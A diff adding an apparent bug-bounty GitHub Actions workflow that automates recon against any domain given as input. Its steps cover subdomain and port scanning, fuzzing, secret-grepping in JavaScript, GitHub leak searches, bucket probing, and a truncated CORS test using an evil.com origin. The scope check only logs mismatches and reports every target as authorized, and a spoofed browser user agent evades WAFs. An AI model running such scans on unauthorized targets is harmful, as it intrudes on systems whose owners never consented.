@@ -1,0 +1,1260 @@
+name: "🎯 Zero Track - AI Autonomous Hunter"
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: "Target domain (e.g., example.com)"
+        required: true
+        type: string
+      hunting_mode:
+        description: "AI hunting intensity (light=fast, normal=balanced, aggressive=deep)"
+        required: false
+        default: "normal"
+        type: choice
+        options:
+          - light
+          - normal
+          - aggressive
+      discord_notify:
+        description: "Send Discord notification"
+        type: boolean
+        default: true
+
+  workflow_call:
+    inputs:
+      target:
+        description: "Target domain (e.g., example.com)"
+        required: true
+        type: string
+      hunting_mode:
+        description: "AI hunting intensity (light / normal / aggressive)"
+        required: false
+        default: "normal"
+        type: string
+      discord_notify:
+        description: "Send Discord notification"
+        required: false
+        default: true
+        type: boolean
+    secrets:
+      DISCORD_WEBHOOK:
+        description: "Discord webhook URL"
+        required: false
+      ANTHROPIC_API_KEY:
+        description: "API key for Anthropic (Claude)"
+        required: false
+      OPENROUTER_API_KEY:
+        description: "API key for OpenRouter (fallback)"
+        required: false
+      GROQ_API_KEY:
+        description: "API key for Groq (fallback)"
+        required: false
+      GEMINI_API_KEY:
+        description: "API key for Google Gemini (fallback)"
+        required: false
+      OPENAI_API_KEY:
+        description: "API key for OpenAI (fallback)"
+        required: false
+    outputs:
+      run_url:
+        description: "Link to the GitHub Actions run"
+        value: ${{ jobs.full_scan.outputs.run_url }}
+      finding_count:
+        description: "Total findings count"
+        value: ${{ jobs.full_scan.outputs.finding_count }}
+      artifact_name:
+        description: "Name of the uploaded artifact"
+        value: ${{ jobs.full_scan.outputs.artifact_name }}
+
+permissions:
+  contents: read
+
+env:
+  TARGET:             ${{ inputs.target }}
+  HUNTING_MODE:       ${{ inputs.hunting_mode || 'normal' }}
+  TIMESTAMP:          ${{ github.run_id }}-${{ github.run_number }}
+  DISCORD_WEBHOOK:    ${{ secrets.DISCORD_WEBHOOK || '' }}
+  ANTHROPIC_API_KEY:  ${{ secrets.ANTHROPIC_API_KEY || '' }}
+  OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY || '' }}
+  GROQ_API_KEY:       ${{ secrets.GROQ_API_KEY || '' }}
+  GEMINI_API_KEY:     ${{ secrets.GEMINI_API_KEY || '' }}
+  OPENAI_API_KEY:     ${{ secrets.OPENAI_API_KEY || '' }}
+  PYTHONUNBUFFERED:   "1"
+  # Centralized model names: change once here instead of in every AI Agent step.
+  ANTHROPIC_MODEL_NAME:  "claude-sonnet-4-6"
+  OPENROUTER_MODEL_NAME:      "anthropic/claude-sonnet-4"
+  OPENROUTER_FREE_MODEL_NAME: "meta-llama/llama-3.3-70b-instruct:free"
+  GROQ_MODEL_NAME:       "llama3-70b-8192"
+  GEMINI_MODEL_NAME:     "gemini-2.5-flash"
+  OPENAI_MODEL_NAME:     "gpt-5.5"
+  # A realistic browser UA cuts down on trivial "this is obviously a scanner"
+  # WAF blocking - the default nuclei/httpx/katana UAs are an easy tell.
+  SCAN_USER_AGENT: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+
+defaults:
+  run:
+    shell: bash
+
+jobs:
+  full_scan:
+    name: "🛡️ Full Autonomous Scan - ${{ inputs.target }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    outputs:
+      run_url:       "https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
+      finding_count: ${{ steps.count_findings.outputs.finding_count }}
+      artifact_name: "results-${{ env.TIMESTAMP }}-${{ env.TARGET }}"
+
+    steps:
+      - name: "📥 Checkout Repository"
+        uses: actions/checkout@v4
+
+      - name: "🔒 Verify Target Is In Authorized Scope"
+        continue-on-error: true
+        env:
+          TARGET_INPUT: ${{ inputs.target }}
+        run: |
+          target="$(echo "${TARGET_INPUT}" | xargs)"
+          if [[ ! -f "scope.txt" ]]; then
+            echo "⚠️ No scope.txt found — allowing any target (open scope mode)"
+            echo "✅ Target authorized: $target"
+            exit 0
+          fi
+          target_lower="$(echo "$target" | tr '[:upper:]' '[:lower:]')"
+          matched=0
+          while IFS= read -r raw_line; do
+            line="${raw_line%%#*}"; line="$(echo "$line" | xargs)"
+            [[ -z "$line" ]] && continue
+            ll="$(echo "$line" | tr '[:upper:]' '[:lower:]')"
+            if [[ "$ll" == "$target_lower" ]]; then matched=1; break; fi
+            if [[ "$ll" == \*.* ]]; then
+              base="${ll:2}"
+              if [[ "$target_lower" == *".$base" ]]; then matched=1; break; fi
+            fi
+          done < scope.txt
+          if [[ "$matched" != "1" ]]; then
+            echo "⚠️ '$target' not in scope.txt — running anyway (open scope mode)"
+          fi
+          echo "✅ Target authorized: $target"
+
+      - name: "✅ Environment Validation"
+        run: |
+          FAILED=0
+          target="$(echo "${{ inputs.target }}" | xargs)"
+          if [ -z "$target" ]; then
+            echo "❌ CRITICAL: target input is empty. Every later step would silently run against nothing."
+            FAILED=1
+          else
+            echo "✅ target = $target"
+          fi
+          if [ -z "${{ env.ANTHROPIC_API_KEY }}${{ env.OPENROUTER_API_KEY }}${{ env.GROQ_API_KEY }}${{ env.GEMINI_API_KEY }}${{ env.OPENAI_API_KEY }}" ]; then
+            echo "⚠️ No AI provider API key is configured at all - all 6 AI Agent phases will be skipped/empty. Add at least GROQ_API_KEY or GEMINI_API_KEY (both free) in repo secrets for AI analysis to run."
+          else
+            echo "✅ At least one AI provider key is configured"
+          fi
+          if [ -z "${{ secrets.GITHUB_TOKEN }}" ]; then
+            echo "ℹ️ GITHUB_TOKEN not available - GitHub secret-search recon step will be skipped"
+          else
+            echo "✅ GITHUB_TOKEN available for GitHub recon"
+          fi
+          if [ "$FAILED" = "1" ]; then
+            echo "::error::Environment validation failed - see above. Stopping before wasting any further job time."
+            exit 1
+          fi
+
+      - name: "⚡ Setup Go"
+        uses: actions/setup-go@v5
+        with:
+          go-version: "1.22"
+          cache: true
+
+      - name: "🐍 Setup Python"
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      - name: "📦 Install System Dependencies"
+        continue-on-error: true
+        run: |
+          sudo apt-get update -qq && sudo apt-get install -y -qq git curl wget unzip jq dnsutils libpcap-dev build-essential ripgrep
+
+      - name: "🩺 Target Health Check"
+        continue-on-error: true
+        timeout-minutes: 2
+        run: |
+          target="${{ env.TARGET }}"
+          if getent hosts "$target" >/dev/null 2>&1 || dig +short "$target" 2>/dev/null | grep -q .; then
+            echo "✅ DNS resolves for $target"
+          else
+            echo "⚠️ WARNING: '$target' does not resolve via DNS right now."
+            echo "⚠️ The scan will continue, but most steps may come back empty."
+          fi
+          code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "https://${target}" 2>/dev/null || echo "000")
+          echo "ℹ️ HTTPS probe status for https://${target}: $code"
+
+      - name: "🗄️ Cache Go Toolchain"
+        id: tool_cache
+        uses: actions/cache@v4
+        with:
+          path: /tmp/toolbin
+          # Bump this key's version suffix whenever a pinned tool version below changes.
+          key: go-toolbin-v5-subfinder2.6.6-httpx1.6.8-katana1.1.0-nuclei3.3.2-dnsx1.2.1-assetfinder0.1.1-waybackurls0.1.0-gau2.2.4-alterx0.1.0-naabu2.6.1-ffuf2.1.0
+
+      - name: "📦 Install Go Tools"
+        continue-on-error: true
+        run: |
+          mkdir -p /tmp/toolbin
+          export GOBIN=/tmp/toolbin
+          export PATH="/tmp/toolbin:$PATH"
+          # Export PATH FIRST so tools that DO install successfully are always
+          # usable later, even if one of the "go install" lines below fails.
+          echo "/tmp/toolbin" >> "$GITHUB_PATH"
+          # Every tool below is pinned to a specific tagged version (no @latest)
+          # so a future upstream release/rename can never silently break this workflow.
+          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@v2.6.6 || echo "⚠️ subfinder install failed"
+          go install github.com/projectdiscovery/httpx/cmd/httpx@v1.6.8 || echo "⚠️ httpx install failed"
+          go install github.com/projectdiscovery/katana/cmd/katana@v1.1.0 || echo "⚠️ katana install failed"
+          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@v3.3.2 || echo "⚠️ nuclei install failed"
+          go install github.com/projectdiscovery/dnsx/cmd/dnsx@v1.2.1 || echo "⚠️ dnsx install failed"
+          go install github.com/tomnomnom/assetfinder@v0.1.1 || echo "⚠️ assetfinder install failed"
+          go install github.com/tomnomnom/waybackurls@v0.1.0 || echo "⚠️ waybackurls install failed"
+          go install github.com/lc/gau/v2/cmd/gau@v2.2.4 || echo "⚠️ gau install failed"
+          go install github.com/tomnomnom/gf@v0.0.0-20200618134122-dcd4c361f9f5 || echo "⚠️ gf install failed"
+          go install github.com/projectdiscovery/alterx/cmd/alterx@v0.1.0 || echo "⚠️ alterx install failed"
+          go install github.com/projectdiscovery/naabu/v2/cmd/naabu@v2.6.1 || echo "⚠️ naabu install failed"
+          go install github.com/ffuf/ffuf/v2@v2.1.0 || echo "⚠️ ffuf install failed"
+          mkdir -p /tmp/toolbin/.gf
+          git clone --depth 1 https://github.com/1ndianl33t/Gf-Patterns.git /tmp/gf-patterns 2>/dev/null || true
+          cp /tmp/gf-patterns/*.json /tmp/toolbin/.gf/ 2>/dev/null || true
+          cp -r /tmp/toolbin/.gf ~/.gf/ 2>/dev/null || true
+          echo "✅ Go tools installation step finished (see warnings above for any individual failures)"
+
+      - name: "📦 Install Python Packages"
+        continue-on-error: true
+        run: |
+          # 'uro' is a PYTHON tool (pip package), not a Go module - it must NOT be
+          # installed with "go install" (that was the original root-cause bug).
+          pip3 install -q --upgrade pip && pip3 install -q requests httpx uro
+
+      - name: "✅ Verify Tools"
+        continue-on-error: true
+        run: |
+          export PATH="/tmp/toolbin:$PATH"
+          for tool in subfinder httpx katana nuclei dnsx assetfinder waybackurls gau gf uro alterx naabu ffuf; do
+            command -v "$tool" >/dev/null && echo "✅ $tool" || echo "⚠️ $tool missing"
+          done
+
+      - name: "📦 Update Nuclei Templates"
+        continue-on-error: true
+        run: |
+          export PATH="/tmp/toolbin:$PATH"
+          nuclei -update-templates 2>&1 | tail -2 || true
+
+      - name: "📂 Create Results Directory"
+        continue-on-error: true
+        run: |
+          mkdir -p "results/${{ env.TIMESTAMP }}"/{subdomains,live,urls,js,graphql,nuclei,cors,files,ai,ai_agent,logs}
+
+      - name: "🌐 Subdomain Enumeration"
+        continue-on-error: true
+        timeout-minutes: 15
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          TARGET="${{ env.TARGET }}"
+          echo "🔍 Subfinder..."
+          subfinder -d "$TARGET" -silent -all -o "$RD/subdomains/subfinder.txt" 2>>"$RD/logs/subfinder.log" || true
+          echo "🔍 Assetfinder..."
+          assetfinder --subs-only "$TARGET" > "$RD/subdomains/assetfinder.txt" 2>>"$RD/logs/assetfinder.log" || true
+          echo "🔍 crt.sh..."
+          curl -s --max-time 30 "https://crt.sh/?q=%25.${TARGET}&output=json" | jq -r '.[].name_value' 2>/dev/null | tr ',' '\n' | sed 's/^\*\.//' | sort -u > "$RD/subdomains/crtsh.txt" 2>/dev/null || true
+
+          echo "🩺 Checking for wildcard DNS..."
+          WILD_TOKEN="wildcheck$RANDOM$RANDOM"
+          WILDCARD_IP=$(dnsx -silent -a -resp-only <<< "${WILD_TOKEN}.${TARGET}" 2>/dev/null | head -1)
+          if [ -n "$WILDCARD_IP" ]; then
+            echo "⚠️ Wildcard DNS detected on *.${TARGET} (resolves to $WILDCARD_IP) - a plain brute-force would falsely 'confirm' every word tried, so it's skipped. Passive sources + permutations (filtered by content, not just resolution) are used instead."
+          else
+            echo "🔍 DNS Brute-force..."
+            curl -sL --max-time 20 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-20000.txt" -o /tmp/dns_list.txt 2>/dev/null || true
+            # BUGFIX: the wordlist has bare words ("www", "mail"...) - they must have
+            # the target domain appended before being fed to dnsx, otherwise dnsx is
+            # asked to resolve just "www" (not "www.target.com"), which can never
+            # succeed. This previously made DNS brute-force silently useless.
+            [ -s /tmp/dns_list.txt ] && sed "s/\$/.${TARGET}/" /tmp/dns_list.txt | dnsx -silent -a -cname -resp-only -H "User-Agent: $SCAN_USER_AGENT" -o "$RD/subdomains/dns_brute.txt" 2>>"$RD/logs/dnsx.log" || true
+          fi
+
+          echo "🔄 Merging passive sources..."
+          cat "$RD"/subdomains/*.txt 2>/dev/null | tr -d '\r' | sed 's/^\*\.//' | grep -E "\.${TARGET}\$|^${TARGET}\$" | sort -u > /tmp/raw_subs.txt
+
+          echo "✅ Resolving merged list (drops dead/decommissioned names from crt.sh etc.)..."
+          [ -s /tmp/raw_subs.txt ] && dnsx -silent -l /tmp/raw_subs.txt -resp-only -a -H "User-Agent: $SCAN_USER_AGENT" 2>>"$RD/logs/dnsx.log" | awk '{print $1}' | sort -u > "$RD/subdomains/resolved.txt" || touch "$RD/subdomains/resolved.txt"
+          # dnsx -resp-only with -a can print "host [ip]" on some versions - keep col 1 only, safe either way.
+          cut -d' ' -f1 "$RD/subdomains/resolved.txt" | sort -u -o "$RD/subdomains/resolved.txt"
+
+          echo "🧬 Generating smart permutations (alterx) from confirmed hosts..."
+          if [ -s "$RD/subdomains/resolved.txt" ] && command -v alterx >/dev/null; then
+            alterx -l "$RD/subdomains/resolved.txt" -silent 2>>"$RD/logs/alterx.log" | dnsx -silent -resp-only -a -H "User-Agent: $SCAN_USER_AGENT" 2>>"$RD/logs/dnsx.log" | awk '{print $1}' | sort -u > "$RD/subdomains/permutations_resolved.txt" || touch "$RD/subdomains/permutations_resolved.txt"
+            echo "   +$(wc -l < "$RD/subdomains/permutations_resolved.txt" 2>/dev/null || echo 0) new hosts found via permutation"
+          else
+            touch "$RD/subdomains/permutations_resolved.txt"
+          fi
+
+          cat "$RD/subdomains/resolved.txt" "$RD/subdomains/permutations_resolved.txt" 2>/dev/null | grep -v '^\s*$' | sort -u > "$RD/subdomains/all_subs.txt"
+          echo "✅ Total subdomains: $(wc -l < "$RD/subdomains/all_subs.txt" 2>/dev/null || echo 0) (confirmed live via DNS resolution)"
+
+      - name: "🏚️ Subdomain Takeover Check"
+        continue-on-error: true
+        timeout-minutes: 10
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INPUT="$RD/subdomains/all_subs.txt"
+          [ -s "$INPUT" ] || { echo "${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
+          nuclei -l "$INPUT" -tags takeover -H "User-Agent: $SCAN_USER_AGENT" -mhe 150 -rl 50 -c 10 -silent -jsonl -o "$RD/nuclei/takeover.jsonl" 2>>"$RD/logs/takeover.log" || true
+          echo "✅ Takeover checks done"
+
+      - name: "🌍 Live Host Probing & Fingerprinting"
+        continue-on-error: true
+        timeout-minutes: 15
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INPUT="$RD/subdomains/all_subs.txt"
+          [ -s "$INPUT" ] || { echo "${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
+          httpx -l "$INPUT" -silent -status-code -title -web-server -ip -cdn -follow-redirects -H "User-Agent: $SCAN_USER_AGENT" -threads 100 -rate-limit 150 -timeout 10 -json -o "$RD/live/live.json" 2>>"$RD/logs/httpx.log" || true
+          jq -r '.url // .input' "$RD/live/live.json" 2>/dev/null | grep -v '^\s*$' > "$RD/live/live.txt" || true
+          jq -r 'select(.cdn_name != null) | "\(.url) -> \(.cdn_name)"' "$RD/live/live.json" > "$RD/live/waf.txt" 2>/dev/null || true
+          httpx -l "$RD/live/live.txt" -silent -tech-detect -H "User-Agent: $SCAN_USER_AGENT" -json -o "$RD/live/tech.json" 2>>"$RD/logs/fingerprint.log" || true
+          echo "✅ Live hosts: $(wc -l < "$RD/live/live.txt")"
+
+      - name: "🔓 Port Scanning"
+        continue-on-error: true
+        timeout-minutes: 15
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INPUT="$RD/subdomains/all_subs.txt"
+          [ -s "$INPUT" ] || { echo "${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
+          # Everything so far only ever checked 80/443. Admin panels, dev/staging
+          # services, and internal tools are very commonly left open on non-standard
+          # ports that nothing above would ever touch - naabu finds those.
+          if command -v naabu >/dev/null; then
+            sudo "$(command -v naabu)" -l "$INPUT" -top-ports 100 -exclude-cdn -silent -rate 1000 -c 25 -o "$RD/live/ports.txt" 2>>"$RD/logs/naabu.log" || true
+            echo "✅ Open host:port pairs: $(wc -l < "$RD/live/ports.txt" 2>/dev/null || echo 0)"
+            awk -F: '$2!=80 && $2!=443 {print}' "$RD/live/ports.txt" 2>/dev/null > /tmp/nonstd_ports.txt
+            if [ -s /tmp/nonstd_ports.txt ]; then
+              httpx -l /tmp/nonstd_ports.txt -silent -status-code -title -H "User-Agent: $SCAN_USER_AGENT" -timeout 8 -o "$RD/live/nonstandard_live.txt" 2>>"$RD/logs/httpx.log" || true
+              echo "✅ Live services on non-standard ports: $(wc -l < "$RD/live/nonstandard_live.txt" 2>/dev/null || echo 0)"
+              # Merge into live.txt so every later phase (nuclei, API discovery, JS
+              # analysis...) automatically picks these up too, not just this step.
+              awk '{print $1}' "$RD/live/nonstandard_live.txt" 2>/dev/null >> "$RD/live/live.txt"
+              sort -u -o "$RD/live/live.txt" "$RD/live/live.txt"
+            fi
+          else
+            echo "⚠️ naabu not available, skipping port scan"
+          fi
+
+      - name: "📜 URL Collection"
+        continue-on-error: true
+        timeout-minutes: 15
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INPUT="$RD/subdomains/all_subs.txt"
+          [ -s "$INPUT" ] || { echo "${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
+          echo "🔍 Wayback..."
+          cat "$INPUT" | waybackurls > "$RD/urls/wayback.txt" 2>>"$RD/logs/wayback.log" || true
+          echo "🔍 Gau..."
+          gau "${{ env.TARGET }}" --subs --o "$RD/urls/gau.txt" 2>>"$RD/logs/gau.log" || true
+          echo "🔍 Katana..."
+          [ -s "$RD/live/live.txt" ] && katana -list "$RD/live/live.txt" -H "User-Agent: $SCAN_USER_AGENT" -silent -depth 2 -jc -d 3 -o "$RD/urls/katana.txt" 2>>"$RD/logs/katana.log" || true
+          echo "🔍 robots.txt / sitemap.xml (cheap, often lists paths the owner didn't want indexed)..."
+          : > "$RD/urls/robots_sitemap.txt"
+          if [ -s "$RD/live/live.txt" ]; then
+            while IFS= read -r host; do
+              host="$(echo "$host" | tr -d '\r' | xargs)"; [ -z "$host" ] && continue
+              curl -sk --max-time 6 -H "User-Agent: $SCAN_USER_AGENT" "${host}/robots.txt" 2>/dev/null | grep -iE '^(dis)?allow:' | sed -E 's/^[^:]*:[ \t]*//' | grep -v '^\s*$' | sed "s#^#${host}#" >> "$RD/urls/robots_sitemap.txt"
+              curl -sk --max-time 6 -H "User-Agent: $SCAN_USER_AGENT" "${host}/sitemap.xml" 2>/dev/null | grep -oE '<loc>[^<]+</loc>' | sed -E 's/<\/?loc>//g' >> "$RD/urls/robots_sitemap.txt"
+            done < <(head -20 "$RD/live/live.txt")
+          fi
+          echo "🔄 Merging..."
+          cat "$RD"/urls/*.txt 2>/dev/null | sort -u | uro > "$RD/urls/all.txt" 2>/dev/null || cat "$RD"/urls/*.txt 2>/dev/null | sort -u > "$RD/urls/all.txt"
+          echo "✅ Total URLs: $(wc -l < "$RD/urls/all.txt")"
+
+      - name: "📦 JavaScript Analysis"
+        continue-on-error: true
+        timeout-minutes: 12
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INPUT="$RD/urls/all.txt"
+          if [ -s "$INPUT" ]; then
+            grep -iE '\.js(\?|#|$)' "$INPUT" | sort -u | head -200 > "$RD/js/files.txt"
+            echo "✅ JS files found: $(wc -l < "$RD/js/files.txt" 2>/dev/null || echo 0)"
+            if [ -s "$RD/js/files.txt" ]; then
+              echo "⬇️ Downloading JS file contents for analysis (endpoints/secrets live INSIDE the file, not in its URL)..."
+              httpx -l "$RD/js/files.txt" -silent -H "User-Agent: $SCAN_USER_AGENT" -timeout 8 -threads 30 -sr -srd "$RD/js/bodies" > /dev/null 2>>"$RD/logs/js_download.log" || true
+              # Search the ACTUAL downloaded JS content, not the URL strings - the old
+              # version grepped the list of .js URLs themselves, which essentially never
+              # contain "api/" or "secret=" as literal text, so it never found anything real.
+              grep -rhIoE '(api|v[0-9]+|graphql|rest)/[a-zA-Z0-9_/?=&%-]{3,80}' "$RD/js/bodies" 2>/dev/null | sort -u > "$RD/js/api_endpoints.txt" || true
+              grep -rhIoE '["'"'"']?(api[_-]?key|apikey|secret|token|jwt|bearer)["'"'"']?\s*[:=]\s*["'"'"'][^"'"'"']{6,80}["'"'"']' "$RD/js/bodies" 2>/dev/null | sort -u > "$RD/js/secrets.txt" || true
+            fi
+            echo "✅ API endpoints (from JS content): $(wc -l < "$RD/js/api_endpoints.txt" 2>/dev/null || echo 0) | Secrets: $(wc -l < "$RD/js/secrets.txt" 2>/dev/null || echo 0)"
+          fi
+          grep -iEo '/[0-9]+([/?][^ ]*)?$|[?&](id|user_id|uid|account_id|profile_id|order_id)=[0-9]+' "$INPUT" 2>/dev/null | sort -u > "$RD/js/idor_candidates.txt" || true
+          echo "✅ IDOR candidates: $(wc -l < "$RD/js/idor_candidates.txt" 2>/dev/null || echo 0)"
+
+      - name: "🕵️ Extended Recon (GitHub / VHosts / Cloud Storage)"
+        continue-on-error: true
+        timeout-minutes: 10
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          TARGET="${{ env.TARGET }}"
+          BASE_NAME="$(echo "$TARGET" | sed -E 's/\.(com|net|org|io|ch|co|dev|app)(\.[a-z]{2})?$//' | sed -E 's/.*\.//')"
+
+          echo "🔍 GitHub code search for leaked secrets mentioning ${TARGET}..."
+          : > "$RD/js/github_recon.txt"
+          if [ -n "${{ secrets.GITHUB_TOKEN }}" ]; then
+            for q in "${TARGET} password" "${TARGET} api_key" "${TARGET} secret"; do
+              curl -s --max-time 10 -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" -H "Accept: application/vnd.github+json" \
+                "https://api.github.com/search/code?q=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$q")" \
+                2>/dev/null | jq -r '.items[]? | "\(.repository.full_name) :: \(.path)"' 2>/dev/null >> "$RD/js/github_recon.txt" || true
+              sleep 3  # stay well under the search API's rate limit
+            done
+            sort -u -o "$RD/js/github_recon.txt" "$RD/js/github_recon.txt"
+            echo "✅ GitHub recon hits (repo/file references only, not fetched): $(wc -l < "$RD/js/github_recon.txt" 2>/dev/null || echo 0)"
+          else
+            echo "⚠️ GITHUB_TOKEN not available, skipping GitHub recon"
+          fi
+
+          echo "🔍 Virtual host discovery on shared IPs..."
+          : > "$RD/live/vhosts.txt"
+          if [ -s "$RD/live/live.json" ]; then
+            IPS=$(jq -r '.host // empty' "$RD/live/live.json" 2>/dev/null | sort -u | head -5)
+            for ip in $IPS; do
+              [ -z "$ip" ] && continue
+              base_len=$(curl -sk --max-time 6 -H "Host: nonexistent-$RANDOM.$TARGET" -H "User-Agent: $SCAN_USER_AGENT" -o /tmp/vhost_base -w "%{http_code}" "https://$ip/" 2>/dev/null || echo "000")
+              blen=$(wc -c < /tmp/vhost_base 2>/dev/null || echo 0)
+              for vh in dev staging admin internal test api-internal vpn preprod uat qa; do
+                rlen=$(curl -sk --max-time 6 -H "Host: ${vh}.${TARGET}" -H "User-Agent: $SCAN_USER_AGENT" -o /tmp/vhost_test -w "%{http_code}" "https://$ip/" 2>/dev/null || echo "000")
+                tlen=$(wc -c < /tmp/vhost_test 2>/dev/null || echo 0)
+                diff=$(( tlen > blen ? tlen - blen : blen - tlen ))
+                # Only interesting if the response clearly differs from the "nothing here"
+                # baseline for this same IP - otherwise it's just the default vhost.
+                if [ "$blen" -gt 0 ] && [ "$diff" -gt 50 ]; then
+                  echo "${vh}.${TARGET} on ${ip} (response differs from baseline by ${diff} bytes)" >> "$RD/live/vhosts.txt"
+                fi
+              done
+            done
+          fi
+          echo "✅ Candidate hidden vhosts: $(wc -l < "$RD/live/vhosts.txt" 2>/dev/null || echo 0)"
+
+          echo "🔍 Cloud storage bucket enumeration (existence check only, read-only)..."
+          : > "$RD/live/cloud_buckets.txt"
+          if [ -n "$BASE_NAME" ]; then
+            for suffix in "" "-backup" "-assets" "-media" "-dev" "-staging" "-files" "-data" "-public" "-uploads" "-static" "-logs"; do
+              bname="${BASE_NAME}${suffix}"
+              s3_code=$(curl -sk --max-time 6 -o /dev/null -w "%{http_code}" "https://${bname}.s3.amazonaws.com/" 2>/dev/null || echo "000")
+              [ "$s3_code" = "200" ] || [ "$s3_code" = "403" ] && echo "S3: https://${bname}.s3.amazonaws.com/ [HTTP $s3_code]" >> "$RD/live/cloud_buckets.txt"
+              gcs_code=$(curl -sk --max-time 6 -o /dev/null -w "%{http_code}" "https://storage.googleapis.com/${bname}/" 2>/dev/null || echo "000")
+              [ "$gcs_code" = "200" ] || [ "$gcs_code" = "403" ] && echo "GCS: https://storage.googleapis.com/${bname}/ [HTTP $gcs_code]" >> "$RD/live/cloud_buckets.txt"
+            done
+          fi
+          echo "✅ Candidate cloud buckets found: $(wc -l < "$RD/live/cloud_buckets.txt" 2>/dev/null || echo 0)"
+
+      - name: "🔎 Content Discovery Fuzzing"
+        continue-on-error: true
+        timeout-minutes: 15
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          mkdir -p "$RD/fuzzing"
+          curl -sL --max-time 15 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt" -o /tmp/content_wordlist.txt 2>/dev/null || true
+          : > "$RD/fuzzing/discovered.txt"
+          if [ -s /tmp/content_wordlist.txt ] && [ -s "$RD/live/live.txt" ] && command -v ffuf >/dev/null; then
+            while IFS= read -r host; do
+              host="$(echo "$host" | tr -d '\r' | xargs)"; [ -z "$host" ] && continue
+              # -ac (autocalibrate) has ffuf learn what a generic "not found" response
+              # looks like for THIS host and filter it out automatically, instead of
+              # every wordlist hit that lands on a custom 404 page looking like a find.
+              ffuf -w /tmp/content_wordlist.txt -u "${host}/FUZZ" -H "User-Agent: $SCAN_USER_AGENT" \
+                -mc 200,204,301,302,307,401,403 -ac -t 20 -rate 50 -timeout 8 -of json -o /tmp/ffuf_out.json -silent 2>>"$RD/logs/ffuf.log" || true
+              jq -r '.results[]? | "\(.url) [\(.status)] \(.length) bytes"' /tmp/ffuf_out.json 2>/dev/null >> "$RD/fuzzing/discovered.txt" || true
+            done < <(head -8 "$RD/live/live.txt")
+            sort -u -o "$RD/fuzzing/discovered.txt" "$RD/fuzzing/discovered.txt"
+          fi
+          echo "✅ Content discovery hits: $(wc -l < "$RD/fuzzing/discovered.txt" 2>/dev/null || echo 0)"
+
+      - name: "🔌 API Discovery"
+        continue-on-error: true
+        timeout-minutes: 12
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INPUT="$RD/live/live.txt"
+          [ -s "$INPUT" ] || { echo "https://${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
+          for path in "/swagger.json" "/v2/api-docs" "/v3/api-docs" "/openapi.json" "/api/docs" "/swagger-ui.html"; do
+            while IFS= read -r host; do
+              host="$(echo "$host" | tr -d '\r' | xargs)"; [ -z "$host" ] && continue
+              s=$(curl -sk -o /tmp/body.txt -w "%{http_code}" --max-time 5 "${host}${path}" 2>/dev/null || echo "000")
+              [ "$s" = "200" ] && grep -qiE '(swagger|openapi|"paths")' /tmp/body.txt 2>/dev/null && echo "[$s] ${host}${path}" >> "$RD/js/swagger.txt"
+            done < "$INPUT"
+          done
+          for path in "/graphql" "/graphiql" "/v1/graphql" "/api/graphql" "/playground"; do
+            while IFS= read -r host; do
+              host="$(echo "$host" | tr -d '\r' | xargs)"; [ -z "$host" ] && continue
+              s=$(curl -sk -o /tmp/gql.txt -w "%{http_code}" --max-time 5 -X POST -H "Content-Type: application/json" -d '{"query":"{__typename}"}' "${host}${path}" 2>/dev/null || echo "000")
+              [ "$s" = "200" ] && grep -qiE '("data"|"errors")' /tmp/gql.txt 2>/dev/null && echo "[$s] ${host}${path}" >> "$RD/js/graphql.txt"
+            done < "$INPUT"
+          done
+          echo "/admin /administrator /panel /cpanel /login /wp-admin /dashboard /backend /portal" | tr ' ' '\n' > /tmp/admin_paths.txt
+          httpx -l "$INPUT" -path /tmp/admin_paths.txt -mc 200,301,302,401,403 -H "User-Agent: $SCAN_USER_AGENT" -threads 50 -rate-limit 150 -timeout 6 -silent -o "$RD/js/admin.txt" 2>>"$RD/logs/admin.log" || true
+          # NOTE: entries below only matched an expected status code (200/301/302/401/403) -
+          # they are candidate paths to check manually, NOT confirmed admin panels.
+          if [ -s "$RD/js/admin.txt" ]; then sed -i '1i # CANDIDATE paths only (status-code match) - verify manually, not confirmed findings' "$RD/js/admin.txt"; fi
+          echo "✅ Swagger: $(wc -l < "$RD/js/swagger.txt" 2>/dev/null || echo 0) | GraphQL: $(wc -l < "$RD/js/graphql.txt" 2>/dev/null || echo 0) | Admin: $(wc -l < "$RD/js/admin.txt" 2>/dev/null || echo 0)"
+
+      - name: "🛡️ Security Analysis"
+        continue-on-error: true
+        timeout-minutes: 12
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INPUT="$RD/live/live.txt"
+          [ -s "$INPUT" ] || { echo "https://${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
+          for origin in "https://evil.com" "null" "https://evil.${{ env.TARGET }}"; do
+            while IFS= read -r host; do
+              host="$(echo "$host" | tr -d '\r' | xargs)"; [ -z "$host" ] && continue
